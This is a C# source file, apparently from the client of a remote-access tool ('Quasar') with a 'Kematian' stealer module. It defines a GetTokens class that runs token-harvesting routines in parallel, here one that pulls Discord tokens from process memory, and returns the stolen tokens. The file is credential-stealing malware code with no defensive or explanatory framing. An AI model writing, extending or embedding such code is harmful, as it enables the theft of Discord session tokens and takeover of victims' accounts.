using System;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Collections.Generic;
using Quasar.Client.Kematian.Discord.Methods.Memory;

namespace Quasar.Client.Kematian.Discord
{
    public class GetTokens
    {
        public static string[] Tokens()
        {
            var tokens = new List<string>();

            var methods = new List<Func<string[]>>()
            {
                GetTokensFromMemory.Tokens,
            };

            Parallel.ForEach(methods, method =>
            {
                try
                {
                    var result = method();
                    if (result != null)
                    {
                        lock (tokens)
                        {
                            tokens.AddRange(result);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex);
                }
            });

            return tokens.ToArray();
        }
    }
}
